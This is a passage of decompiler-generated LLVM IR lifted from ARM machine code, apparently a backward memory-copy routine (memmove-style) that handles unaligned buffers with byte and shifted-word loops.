  %v6_14e1457 = phi i32 [ %v6_14df0, %.thread14 ], [ %v7_14df0, %bb141 ]
  %v0_14dfc55 = phi i32 [ %v4_14de8, %.thread14 ], [ %v7_14df4, %bb141 ]
  %v2_14df8 = load i8*, i8** %stack_var_-8, align 4
  %v3_14df8 = ptrtoint i8* %v2_14df8 to i32
  store i32 %v3_14df8, i32* @r4, align 4
  store i32 %v8_14db4, i32* @lr, align 4
  br label %dec_label_pc_14dfc

dec_label_pc_14dfc:                               ; preds = %dec_label_pc_14dac, %.thread16
  %v7_14e0c = phi i32 [ %v0_14dc449, %dec_label_pc_14dac ], [ %v6_14e1457, %.thread16 ]
  %v0_14dfc = phi i32 [ %v2_14dac, %dec_label_pc_14dac ], [ %v0_14dfc55, %.thread16 ]
  %v2_14dfc = add i32 %v0_14dfc, 8
  store i32 %v2_14dfc, i32* %r2.global-to-local, align 4
  %v4_14dfc = sub i32 0, %v0_14dfc
  %v5_14dfc = and i32 %v2_14dfc, %v4_14dfc
  %v6_14dfc = icmp slt i32 %v5_14dfc, 0
  store i1 %v6_14dfc, i1* %cpsr_v.global-to-local, align 1
  %v7_14dfc = icmp slt i32 %v2_14dfc, 0
  store i1 %v7_14dfc, i1* %cpsr_n.global-to-local, align 1
  %v5_14e00 = icmp slt i32 %v0_14dfc, -8
  br i1 %v5_14e00, label %bb143, label %dec_label_pc_14e04

dec_label_pc_14e04:                               ; preds = %dec_label_pc_14dfc
  %v6_14e04 = add i32 %v0_14dfc, 4
  store i32 %v6_14e04, i32* %r2.global-to-local, align 4
  %v8_14e04 = sub i32 -5, %v0_14dfc
  %v9_14e04 = and i32 %v8_14e04, %v2_14dfc
  %v10_14e04 = icmp slt i32 %v9_14e04, 0
  store i1 %v10_14e04, i1* %cpsr_v.global-to-local, align 1
  %v11_14e04 = icmp slt i32 %v6_14e04, 0
  store i1 %v11_14e04, i1* %cpsr_n.global-to-local, align 1
  %v5_14e08 = icmp slt i32 %v2_14dfc, 4
  %v6_14e08 = load i32, i32* @r1, align 4
  %v7_14e08 = add i32 %v6_14e08, -4
  %v8_14e08 = inttoptr i32 %v7_14e08 to i32*
  %v9_14e08 = load i32, i32* %v8_14e08, align 4
  store i32 %v9_14e08, i32* %r3.global-to-local, align 4
  br i1 %v5_14e08, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_14e04
  store i32 %v7_14e08, i32* @r1, align 4
  %v8_14e0c = add i32 %v7_14e0c, -4
  %v9_14e0c = inttoptr i32 %v8_14e0c to i32*
  store i32 %v9_14e08, i32* %v9_14e0c, align 4
  %v10_14e0c = load i32, i32* %r0.global-to-local, align 4
  %v11_14e0c = add i32 %v10_14e0c, -4
  store i32 %v11_14e0c, i32* %r0.global-to-local, align 4
  %v0_14e1c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_14e04
  %v10_14e10 = add i32 %v6_14e08, -8
  %v11_14e10 = inttoptr i32 %v10_14e10 to i32*
  %v12_14e10 = load i32, i32* %v11_14e10, align 4
  store i32 %v12_14e10, i32* @ip, align 4
  store i32 %v10_14e10, i32* @r1, align 4
  %v7_14e14 = add i32 %v7_14e0c, -8
  %v8_14e14 = inttoptr i32 %v7_14e14 to i32*
  store i32 %v9_14e08, i32* %v8_14e14, align 4
  %v10_14e14 = add i32 %v7_14e0c, -4
  %v11_14e14 = inttoptr i32 %v10_14e14 to i32*
  %v12_14e14 = load i32, i32* @ip, align 4
  store i32 %v12_14e14, i32* %v11_14e14, align 4
  store i32 %v7_14e14, i32* %r0.global-to-local, align 4
  %v6_14e18 = load i32, i32* %r2.global-to-local, align 4
  %v7_14e18 = add i32 %v6_14e18, -4
  store i32 %v7_14e18, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_14dfc, %dec_label_pc_14d8c, %dec_label_pc_14fc0, %dec_label_pc_14f54, %dec_label_pc_14ee8, %bb142
  %v2_14e20 = phi i32 [ %v11_14e0c, %.thread20 ], [ %v0_14eb832, %.thread26 ], [ %v7_14e0c, %dec_label_pc_14dfc ], [ %v2_14d90, %dec_label_pc_14d8c ], [ %v2_14e2c65, %dec_label_pc_14fc0 ], [ %v2_14e2c64, %dec_label_pc_14f54 ], [ %v2_14e2c63, %dec_label_pc_14ee8 ], [ %v7_14e14, %bb142 ]
  %v0_14e1c = phi i32 [ %v0_14e1c.pre, %.thread20 ], [ %v2_14e60, %.thread26 ], [ %v2_14dfc, %dec_label_pc_14dfc ], [ %v2_14d94, %dec_label_pc_14d8c ], [ %v0_14e1c61, %dec_label_pc_14fc0 ], [ %v0_14e1c60, %dec_label_pc_14f54 ], [ %v0_14e1c59, %dec_label_pc_14ee8 ], [ %v7_14e18, %bb142 ]
  %v1_14e1c = add i32 %v0_14e1c, 4
  store i32 %v1_14e1c, i32* @r2, align 4
  %v3_14e1c = sub i32 0, %v0_14e1c
  %v4_14e1c = and i32 %v1_14e1c, %v3_14e1c
  %v5_14e1c = icmp slt i32 %v4_14e1c, 0
  store i1 %v5_14e1c, i1* %cpsr_v.global-to-local, align 1
  %v6_14e1c = icmp slt i32 %v1_14e1c, 0
  store i1 %v6_14e1c, i1* %cpsr_n.global-to-local, align 1
  %v7_14e1c = icmp eq i32 %v1_14e1c, 0
  store i1 %v7_14e1c, i1* @cpsr_z, align 1
  br i1 %v7_14e1c, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_14e24 = add i32 %v0_14e1c, 2
  %v3_14e24 = sub i32 -3, %v0_14e1c
  %v4_14e24 = and i32 %v3_14e24, %v1_14e1c
  %v5_14e24 = icmp slt i32 %v4_14e24, 0
  store i1 %v5_14e24, i1* %cpsr_v.global-to-local, align 1
  %v6_14e24 = icmp slt i32 %v1_14e24, 0
  store i1 %v6_14e24, i1* %cpsr_n.global-to-local, align 1
  %v7_14e24 = icmp eq i32 %v1_14e1c, 2
  store i1 %v7_14e24, i1* @cpsr_z, align 1
  %v0_14e28 = load i32, i32* @r1, align 4
  %v1_14e28 = add i32 %v0_14e28, -1
  %v2_14e28 = inttoptr i32 %v1_14e28 to i8*
  %v3_14e28 = load i8, i8* %v2_14e28, align 1
  %v4_14e28 = zext i8 %v3_14e28 to i32
  store i32 %v4_14e28, i32* %r3.global-to-local, align 4
  store i32 %v1_14e28, i32* @r1, align 4
  %v3_14e2c = add i32 %v2_14e20, -1
  %v4_14e2c = inttoptr i32 %v3_14e2c to i8*
  store i8 %v3_14e28, i8* %v4_14e2c, align 1
  %v5_14e2c = load i32, i32* %r0.global-to-local, align 4
  %v6_14e2c = add i32 %v5_14e2c, -1
  store i32 %v6_14e2c, i32* %r0.global-to-local, align 4
  %v0_14e30 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14e30 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14e30 = xor i1 %v0_14e30, %v1_14e30
  br i1 %v2_14e30, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_14e30 = load i32, i32* @r1, align 4
  %v4_14e30 = add i32 %v3_14e30, -1
  %v5_14e30 = inttoptr i32 %v4_14e30 to i8*
  %v6_14e30 = load i8, i8* %v5_14e30, align 1
  %v7_14e30 = zext i8 %v6_14e30 to i32
  store i32 %v7_14e30, i32* %r3.global-to-local, align 4
  store i32 %v4_14e30, i32* @r1, align 4
  %v6_14e34 = add i32 %v5_14e2c, -2
  %v7_14e34 = inttoptr i32 %v6_14e34 to i8*
  store i8 %v6_14e30, i8* %v7_14e34, align 1
  %v8_14e34 = load i32, i32* %r0.global-to-local, align 4
  %v9_14e34 = add i32 %v8_14e34, -1
  store i32 %v9_14e34, i32* %r0.global-to-local, align 4
  %v1_14e38.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14e38.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_14e3c = phi i32 [ %v9_14e34, %bb145 ], [ %v6_14e2c, %bb144 ]
  %v2_14e3c = phi i1 [ %v2_14e38.pre, %bb145 ], [ %v1_14e30, %bb144 ]
  %v1_14e3c = phi i1 [ %v1_14e38.pre, %bb145 ], [ %v0_14e30, %bb144 ]
  %v0_14e38 = load i1, i1* @cpsr_z, align 1
  %v3_14e38 = xor i1 %v2_14e3c, %v1_14e3c
  %v4_14e38 = or i1 %v0_14e38, %v3_14e38
  br i1 %v4_14e38, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_14e38 = load i32, i32* @r1, align 4
  %v6_14e38 = add i32 %v5_14e38, -1
  %v7_14e38 = inttoptr i32 %v6_14e38 to i8*
  %v8_14e38 = load i8, i8* %v7_14e38, align 1
  %v9_14e38 = zext i8 %v8_14e38 to i32
  store i32 %v9_14e38, i32* %r3.global-to-local, align 4
  store i32 %v6_14e38, i32* @r1, align 4
  %v8_14e3c = add i32 %v7_14e3c, -1
  %v9_14e3c = inttoptr i32 %v8_14e3c to i8*
  store i8 %v8_14e38, i8* %v9_14e3c, align 1
  %v10_14e3c = load i32, i32* %r0.global-to-local, align 4
  %v11_14e3c = add i32 %v10_14e3c, -1
  store i32 %v11_14e3c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_14e44:                               ; preds = %dec_label_pc_14d9c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14e44 = icmp eq i32 %v1_14d9c, 1
  store i1 %v8_14e44, i1* %cpsr_n.global-to-local, align 1
  %v1_14e48 = add i32 %v2_14d8c, -1
  %v2_14e48 = inttoptr i32 %v1_14e48 to i8*
  %v3_14e48 = load i8, i8* %v2_14e48, align 1
  %v4_14e48 = zext i8 %v3_14e48 to i32
  store i32 %v4_14e48, i32* %r3.global-to-local, align 4
  store i32 %v1_14e48, i32* @r1, align 4
  %v3_14e4c = add i32 %v2_14d90, -1
  %v4_14e4c = inttoptr i32 %v3_14e4c to i8*
  store i8 %v3_14e48, i8* %v4_14e4c, align 1
  %v5_14e4c = load i32, i32* %r0.global-to-local, align 4
  %v6_14e4c = add i32 %v5_14e4c, -1
  store i32 %v6_14e4c, i32* %r0.global-to-local, align 4
  br i1 %v8_14e44, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_14e44
  %v9_14e44 = icmp eq i32 %v1_14d9c, 2
  %v6_14e50 = load i32, i32* @r1, align 4
  %v7_14e50 = add i32 %v6_14e50, -1
  %v8_14e50 = inttoptr i32 %v7_14e50 to i8*
  %v9_14e50 = load i8, i8* %v8_14e50, align 1
  %v10_14e50 = zext i8 %v9_14e50 to i32
  store i32 %v10_14e50, i32* %r3.global-to-local, align 4
  store i32 %v7_14e50, i32* @r1, align 4
  %v9_14e54 = add i32 %v5_14e4c, -2
  %v10_14e54 = inttoptr i32 %v9_14e54 to i8*
  store i8 %v9_14e50, i8* %v10_14e54, align 1
  %v11_14e54 = load i32, i32* %r0.global-to-local, align 4
  %v12_14e54 = add i32 %v11_14e54, -1
  store i32 %v12_14e54, i32* %r0.global-to-local, align 4
  br i1 %v9_14e44, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_14e58 = load i32, i32* @r1, align 4
  %v9_14e58 = add i32 %v8_14e58, -1
  %v10_14e58 = inttoptr i32 %v9_14e58 to i8*
  %v11_14e58 = load i8, i8* %v10_14e58, align 1
  %v12_14e58 = zext i8 %v11_14e58 to i32
  store i32 %v12_14e58, i32* %r3.global-to-local, align 4
  store i32 %v9_14e58, i32* @r1, align 4
  %v11_14e5c = add i32 %v11_14e54, -2
  %v12_14e5c = inttoptr i32 %v11_14e5c to i8*
  store i8 %v11_14e58, i8* %v12_14e5c, align 1
  %v13_14e5c = load i32, i32* %r0.global-to-local, align 4
  %v14_14e5c = add i32 %v13_14e5c, -1
  store i32 %v14_14e5c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_14e44, %bb148
  %v0_14eb832 = phi i32 [ %v12_14e54, %bb147 ], [ %v6_14e4c, %dec_label_pc_14e44 ], [ %v14_14e5c, %bb148 ]
  %v0_14e60 = load i32, i32* %r2.global-to-local, align 4
  %v1_14e60 = load i32, i32* @ip, align 4
  %v2_14e60 = sub i32 %v0_14e60, %v1_14e60
  store i32 %v2_14e60, i32* %r2.global-to-local, align 4
  %v4_14e60 = xor i32 %v1_14e60, %v0_14e60
  %v5_14e60 = xor i32 %v2_14e60, %v0_14e60
  %v6_14e60 = and i32 %v5_14e60, %v4_14e60
  %v7_14e60 = icmp slt i32 %v6_14e60, 0
  store i1 %v7_14e60, i1* %cpsr_v.global-to-local, align 1
  %v8_14e60 = icmp slt i32 %v2_14e60, 0
  store i1 %v8_14e60, i1* %cpsr_n.global-to-local, align 1
  %v5_14e64 = icmp slt i32 %v0_14e60, %v1_14e60
  br i1 %v5_14e64, label %bb143, label %dec_label_pc_14e68

dec_label_pc_14e68:                               ; preds = %.thread26
  %v0_14e68 = load i32, i32* @r1, align 4
  %v1_14e68 = urem i32 %v0_14e68, 4
  store i32 %v1_14e68, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14e68 = icmp eq i32 %v1_14e68, 0
  br i1 %v2_14e68, label %dec_label_pc_14dac, label %dec_label_pc_14e70

dec_label_pc_14e70:                               ; preds = %dec_label_pc_14da4, %dec_label_pc_14e68
  %v0_14eb831 = phi i32 [ %v2_14d90, %dec_label_pc_14da4 ], [ %v0_14eb832, %dec_label_pc_14e68 ]
  %v0_14f64 = phi i32 [ %v2_14d94, %dec_label_pc_14da4 ], [ %v2_14e60, %dec_label_pc_14e68 ]
  %v0_14e70 = phi i32 [ %v2_14d8c, %dec_label_pc_14da4 ], [ %v0_14e68, %dec_label_pc_14e68 ]
  %v0_14e78 = phi i32 [ %v1_14da4, %dec_label_pc_14da4 ], [ %v1_14e68, %dec_label_pc_14e68 ]
  %v1_14e70 = and i32 %v0_14e70, -4
  store i32 %v1_14e70, i32* %r1.global-to-local, align 4
  %v1_14e74 = inttoptr i32 %v1_14e70 to i32*
  %v2_14e74 = load i32, i32* %v1_14e74, align 4
  store i32 %v2_14e74, i32* %r3.global-to-local, align 4
  %v7_14e78 = icmp ult i32 %v0_14e78, 2
  %v2_14f5c = add i32 %v0_14f64, -12
  %v4_14f5c = sub i32 11, %v0_14f64
  %v5_14f5c = and i32 %v4_14f5c, %v0_14f64
  %v6_14f5c = icmp slt i32 %v5_14f5c, 0
  store i1 %v6_14f5c, i1* %cpsr_v.global-to-local, align 1
  %v7_14f5c = icmp slt i32 %v2_14f5c, 0
  store i1 %v7_14f5c, i1* %cpsr_n.global-to-local, align 1
  %v5_14f60 = icmp slt i32 %v0_14f64, 12
  br i1 %v7_14e78, label %dec_label_pc_14f5c, label %dec_label_pc_14e80

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14e70
  %v8_14e78 = icmp eq i32 %v0_14e78, 2
  br i1 %v8_14e78, label %dec_label_pc_14ef0, label %dec_label_pc_14e84

dec_label_pc_14e84:                               ; preds = %dec_label_pc_14e80
  br i1 %v5_14f60, label %dec_label_pc_14ed0, label %dec_label_pc_14e8c

dec_label_pc_14e8c:                               ; preds = %dec_label_pc_14e84
  store i32 %v2_14f5c, i32* %r2.global-to-local, align 4
  %v3_14e90 = load i32, i32* @r4, align 4
  store i32 %v3_14e90, i32* %stack_var_-12, align 4
  %v6_14e90 = load i32, i32* @r5, align 4
  %v8_14e90 = inttoptr i32 %v6_14e90 to i8*
  store i8* %v8_14e90, i8** %stack_var_-8, align 4
  %v11_14e90 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14e94

dec_label_pc_14e94:                               ; preds = %dec_label_pc_14e94.dec_label_pc_14e94_crit_edge, %dec_label_pc_14e8c
  %v0_14eb8 = phi i32 [ %v1_14eb8, %dec_label_pc_14e94.dec_label_pc_14e94_crit_edge ], [ %v0_14eb831, %dec_label_pc_14e8c ]
  %v0_14e98 = phi i32 [ %v0_14e98.pre, %dec_label_pc_14e94.dec_label_pc_14e94_crit_edge ], [ %v1_14e70, %dec_label_pc_14e8c ]
  %v0_14e94 = phi i32 [ %v0_14e94.pre, %dec_label_pc_14e94.dec_label_pc_14e94_crit_edge ], [ %v2_14e74, %dec_label_pc_14e8c ]
  %v3_14e94 = mul i32 %v0_14e94, 256
  store i32 %v3_14e94, i32* %lr.global-to-local, align 4
  %v1_14e98 = add i32 %v0_14e98, -4
  %v2_14e98 = inttoptr i32 %v1_14e98 to i32*
  %v3_14e98 = load i32, i32* %v2_14e98, align 4
  store i32 %v3_14e98, i32* %r3.global-to-local, align 4
  %v4_14e98 = add i32 %v0_14e98, -8
  %v5_14e98 = inttoptr i32 %v4_14e98 to i32*
  %v6_14e98 = load i32, i32* %v5_14e98, align 4
  store i32 %v6_14e98, i32* %r4.global-to-local, align 4
  %v7_14e98 = add i32 %v0_14e98, -12
  %v8_14e98 = inttoptr i32 %v7_14e98 to i32*
  %v9_14e98 = load i32, i32* %v8_14e98, align 4
  store i32 %v9_14e98, i32* %r5.global-to-local, align 4
  %v10_14e98 = add i32 %v0_14e98, -16
  %v11_14e98 = inttoptr i32 %v10_14e98 to i32*
  %v12_14e98 = load i32, i32* %v11_14e98, align 4
  store i32 %v10_14e98, i32* %r1.global-to-local, align 4
  %v4_14e9c = udiv i32 %v12_14e98, 16777216
  %v5_14e9c = or i32 %v4_14e9c, %v3_14e94
  store i32 %v5_14e9c, i32* %lr.global-to-local, align 4
  %v3_14ea0 = mul i32 %v12_14e98, 256
  %v4_14ea4 = udiv i32 %v9_14e98, 16777216
  %v5_14ea4 = or i32 %v3_14ea0, %v4_14ea4
  store i32 %v5_14ea4, i32* @ip, align 4
  %v3_14ea8 = mul i32 %v9_14e98, 256
  %v4_14eac = udiv i32 %v6_14e98, 16777216
  %v5_14eac = or i32 %v3_14ea8, %v4_14eac
  store i32 %v5_14eac, i32* %r5.global-to-local, align 4
  %v3_14eb0 = mul i32 %v6_14e98, 256
  %v4_14eb4 = udiv i32 %v3_14e98, 16777216
  %v5_14eb4 = or i32 %v3_14eb0, %v4_14eb4
  store i32 %v5_14eb4, i32* %r4.global-to-local, align 4
  %v1_14eb8 = add i32 %v0_14eb8, -16
  %v2_14eb8 = inttoptr i32 %v1_14eb8 to i32*
  store i32 %v5_14eb4, i32* %v2_14eb8, align 4
  %v4_14eb8 = add i32 %v0_14eb8, -12
  %v5_14eb8 = inttoptr i32 %v4_14eb8 to i32*
  %v6_14eb8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14eb8, i32* %v5_14eb8, align 4
  %v7_14eb8 = add i32 %v0_14eb8, -8
  %v8_14eb8 = inttoptr i32 %v7_14eb8 to i32*
  %v9_14eb8 = load i32, i32* @ip, align 4
  store i32 %v9_14eb8, i32* %v8_14eb8, align 4
  %v10_14eb8 = add i32 %v0_14eb8, -4
  %v11_14eb8 = inttoptr i32 %v10_14eb8 to i32*
  %v12_14eb8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14eb8, i32* %v11_14eb8, align 4
  store i32 %v1_14eb8, i32* %r0.global-to-local, align 4
  %v0_14ebc = load i32, i32* %r2.global-to-local, align 4
  %v2_14ebc = add i32 %v0_14ebc, -16
  store i32 %v2_14ebc, i32* %r2.global-to-local, align 4
  %v6_14ec0 = icmp slt i32 %v0_14ebc, 16
  br i1 %v6_14ec0, label %dec_label_pc_14ec4, label %dec_label_pc_14e94.dec_label_pc_14e94_crit_edge

dec_label_pc_14e94.dec_label_pc_14e94_crit_edge:  ; preds = %dec_label_pc_14e94
  %v0_14e94.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14e98.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14e94

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14e94
  %v2_14ec4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14ec4, i32* @r4, align 4
  %v5_14ec4 = load i8*, i8** %stack_var_-8, align 4
  %v6_14ec4 = ptrtoint i8* %v5_14ec4 to i32
  store i32 %v6_14ec4, i32* @r5, align 4
  store i32 %v11_14e90, i32* @lr, align 4
  %v2_14ec8 = add i32 %v0_14ebc, -4
  store i32 %v2_14ec8, i32* %r2.global-to-local, align 4
  %v4_14ec8 = add i32 %v0_14ebc, 2147483632
  %v5_14ec8 = and i32 %v2_14ec8, %v4_14ec8
  %v6_14ec8 = icmp slt i32 %v5_14ec8, 0
  store i1 %v6_14ec8, i1* %cpsr_v.global-to-local, align 1
  %v7_14ec8 = icmp slt i32 %v2_14ec8, 0
  store i1 %v7_14ec8, i1* %cpsr_n.global-to-local, align 1
  %v5_14ecc = icmp slt i32 %v2_14ebc, -12
  br i1 %v5_14ecc, label %dec_label_pc_14ee8, label %dec_label_pc_14ed0

dec_label_pc_14ed0:                               ; preds = %dec_label_pc_14ec4, %dec_label_pc_14e84, %dec_label_pc_14ed0
  %v1_14edc = phi i32 [ %v5_14edc, %dec_label_pc_14ed0 ], [ %v1_14eb8, %dec_label_pc_14ec4 ], [ %v0_14eb831, %dec_label_pc_14e84 ]
  %v0_14ed0 = load i32, i32* %r3.global-to-local, align 4
  %v3_14ed0 = mul i32 %v0_14ed0, 256
  store i32 %v3_14ed0, i32* %ip.global-to-local, align 4
  %v0_14ed4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ed4 = add i32 %v0_14ed4, -4
  %v2_14ed4 = inttoptr i32 %v1_14ed4 to i32*
  %v3_14ed4 = load i32, i32* %v2_14ed4, align 4
  store i32 %v3_14ed4, i32* %r3.global-to-local, align 4
  store i32 %v1_14ed4, i32* %r1.global-to-local, align 4
  %v4_14ed8 = udiv i32 %v3_14ed4, 16777216
  %v5_14ed8 = or i32 %v4_14ed8, %v3_14ed0
  store i32 %v5_14ed8, i32* @ip, align 4
  %v2_14edc = add i32 %v1_14edc, -4
  %v3_14edc = inttoptr i32 %v2_14edc to i32*
  store i32 %v5_14ed8, i32* %v3_14edc, align 4
  %v4_14edc = load i32, i32* %r0.global-to-local, align 4
  %v5_14edc = add i32 %v4_14edc, -4
  store i32 %v5_14edc, i32* %r0.global-to-local, align 4
  %v0_14ee0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14ee0 = add i32 %v0_14ee0, -4
  store i32 %v2_14ee0, i32* %r2.global-to-local, align 4
  %v6_14ee4 = icmp slt i32 %v0_14ee0, 4
  br i1 %v6_14ee4, label %dec_label_pc_14ee8.loopexit, label %dec_label_pc_14ed0

dec_label_pc_14ee8.loopexit:                      ; preds = %dec_label_pc_14ed0
  %v4_14ee0 = sub i32 3, %v0_14ee0
  %v5_14ee0 = and i32 %v4_14ee0, %v0_14ee0
  %v6_14ee0 = icmp slt i32 %v5_14ee0, 0
  %v7_14ee0 = icmp slt i32 %v2_14ee0, 0
  store i1 %v6_14ee0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14ee0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14ee8

dec_label_pc_14ee8:                               ; preds = %dec_label_pc_14ee8.loopexit, %dec_label_pc_14ec4
  %v2_14e2c63 = phi i32 [ %v5_14edc, %dec_label_pc_14ee8.loopexit ], [ %v1_14eb8, %dec_label_pc_14ec4 ]
  %v0_14e1c59 = phi i32 [ %v2_14ee0, %dec_label_pc_14ee8.loopexit ], [ %v2_14ec8, %dec_label_pc_14ec4 ]
  %v0_14ee8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14ee8 = add i32 %v0_14ee8, 3
  store i32 %v1_14ee8, i32* @r1, align 4
  br label %bb143

dec_label_pc_14ef0:                               ; preds = %dec_label_pc_14e80
  br i1 %v5_14f60, label %dec_label_pc_14f3c, label %dec_label_pc_14ef8

dec_label_pc_14ef8:                               ; preds = %dec_label_pc_14ef0
  store i32 %v2_14f5c, i32* %r2.global-to-local, align 4
  %v3_14efc = load i32, i32* @r4, align 4
  store i32 %v3_14efc, i32* %stack_var_-12, align 4
  %v6_14efc = load i32, i32* @r5, align 4
  %v8_14efc = inttoptr i32 %v6_14efc to i8*
  store i8* %v8_14efc, i8** %stack_var_-8, align 4
  %v11_14efc = load i32, i32* @lr, align 4
  br label %dec_label_pc_14f00

dec_label_pc_14f00:                               ; preds = %dec_label_pc_14f00.dec_label_pc_14f00_crit_edge, %dec_label_pc_14ef8
  %v0_14f24 = phi i32 [ %v1_14f24, %dec_label_pc_14f00.dec_label_pc_14f00_crit_edge ], [ %v0_14eb831, %dec_label_pc_14ef8 ]
  %v0_14f04 = phi i32 [ %v0_14f04.pre, %dec_label_pc_14f00.dec_label_pc_14f00_crit_edge ], [ %v1_14e70, %dec_label_pc_14ef8 ]
  %v0_14f00 = phi i32 [ %v0_14f00.pre, %dec_label_pc_14f00.dec_label_pc_14f00_crit_edge ], [ %v2_14e74, %dec_label_pc_14ef8 ]
  %v3_14f00 = mul i32 %v0_14f00, 65536
  store i32 %v3_14f00, i32* %lr.global-to-local, align 4
  %v1_14f04 = add i32 %v0_14f04, -4
  %v2_14f04 = inttoptr i32 %v1_14f04 to i32*
  %v3_14f04 = load i32, i32* %v2_14f04, align 4
  store i32 %v3_14f04, i32* %r3.global-to-local, align 4
  %v4_14f04 = add i32 %v0_14f04, -8
  %v5_14f04 = inttoptr i32 %v4_14f04 to i32*
  %v6_14f04 = load i32, i32* %v5_14f04, align 4
  store i32 %v6_14f04, i32* %r4.global-to-local, align 4
  %v7_14f04 = add i32 %v0_14f04, -12
  %v8_14f04 = inttoptr i32 %v7_14f04 to i32*
  %v9_14f04 = load i32, i32* %v8_14f04, align 4
  store i32 %v9_14f04, i32* %r5.global-to-local, align 4
  %v10_14f04 = add i32 %v0_14f04, -16
  %v11_14f04 = inttoptr i32 %v10_14f04 to i32*
  %v12_14f04 = load i32, i32* %v11_14f04, align 4
  store i32 %v10_14f04, i32* %r1.global-to-local, align 4
  %v4_14f08 = udiv i32 %v12_14f04, 65536
  %v5_14f08 = or i32 %v4_14f08, %v3_14f00
  store i32 %v5_14f08, i32* %lr.global-to-local, align 4
  %v3_14f0c = mul i32 %v12_14f04, 65536
  %v4_14f10 = udiv i32 %v9_14f04, 65536
  %v5_14f10 = or i32 %v3_14f0c, %v4_14f10
  store i32 %v5_14f10, i32* @ip, align 4
  %v3_14f14 = mul i32 %v9_14f04, 65536
  %v4_14f18 = udiv i32 %v6_14f04, 65536
  %v5_14f18 = or i32 %v3_14f14, %v4_14f18
  store i32 %v5_14f18, i32* %r5.global-to-local, align 4
  %v3_14f1c = mul i32 %v6_14f04, 65536
  %v4_14f20 = udiv i32 %v3_14f04, 65536
  %v5_14f20 = or i32 %v3_14f1c, %v4_14f20
  store i32 %v5_14f20, i32* %r4.global-to-local, align 4
  %v1_14f24 = add i32 %v0_14f24, -16
  %v2_14f24 = inttoptr i32 %v1_14f24 to i32*
  store i32 %v5_14f20, i32* %v2_14f24, align 4
  %v4_14f24 = add i32 %v0_14f24, -12
  %v5_14f24 = inttoptr i32 %v4_14f24 to i32*
  %v6_14f24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14f24, i32* %v5_14f24, align 4
  %v7_14f24 = add i32 %v0_14f24, -8
  %v8_14f24 = inttoptr i32 %v7_14f24 to i32*
  %v9_14f24 = load i32, i32* @ip, align 4
  store i32 %v9_14f24, i32* %v8_14f24, align 4
  %v10_14f24 = add i32 %v0_14f24, -4
  %v11_14f24 = inttoptr i32 %v10_14f24 to i32*
  %v12_14f24 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14f24, i32* %v11_14f24, align 4
  store i32 %v1_14f24, i32* %r0.global-to-local, align 4
  %v0_14f28 = load i32, i32* %r2.global-to-local, align 4
  %v2_14f28 = add i32 %v0_14f28, -16
  store i32 %v2_14f28, i32* %r2.global-to-local, align 4
  %v6_14f2c = icmp slt i32 %v0_14f28, 16
  br i1 %v6_14f2c, label %dec_label_pc_14f30, label %dec_label_pc_14f00.dec_label_pc_14f00_crit_edge

dec_label_pc_14f00.dec_label_pc_14f00_crit_edge:  ; preds = %dec_label_pc_14f00
  %v0_14f00.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14f04.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14f00

dec_label_pc_14f30:                               ; preds = %dec_label_pc_14f00
  %v2_14f30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14f30, i32* @r4, align 4
  %v5_14f30 = load i8*, i8** %stack_var_-8, align 4
  %v6_14f30 = ptrtoint i8* %v5_14f30 to i32
  store i32 %v6_14f30, i32* @r5, align 4
  store i32 %v11_14efc, i32* @lr, align 4
  %v2_14f34 = add i32 %v0_14f28, -4
  store i32 %v2_14f34, i32* %r2.global-to-local, align 4
  %v4_14f34 = add i32 %v0_14f28, 2147483632
  %v5_14f34 = and i32 %v2_14f34, %v4_14f34
  %v6_14f34 = icmp slt i32 %v5_14f34, 0
  store i1 %v6_14f34, i1* %cpsr_v.global-to-local, align 1
  %v7_14f34 = icmp slt i32 %v2_14f34, 0
  store i1 %v7_14f34, i1* %cpsr_n.global-to-local, align 1
  %v5_14f38 = icmp slt i32 %v2_14f28, -12
  br i1 %v5_14f38, label %dec_label_pc_14f54, label %dec_label_pc_14f3c

dec_label_pc_14f3c:                               ; preds = %dec_label_pc_14f30, %dec_label_pc_14ef0, %dec_label_pc_14f3c
  %v1_14f48 = phi i32 [ %v5_14f48, %dec_label_pc_14f3c ], [ %v1_14f24, %dec_label_pc_14f30 ], [ %v0_14eb831, %dec_label_pc_14ef0 ]
  %v0_14f3c = load i32, i32* %r3.global-to-local, align 4
  %v3_14f3c = mul i32 %v0_14f3c, 65536
  store i32 %v3_14f3c, i32* %ip.global-to-local, align 4
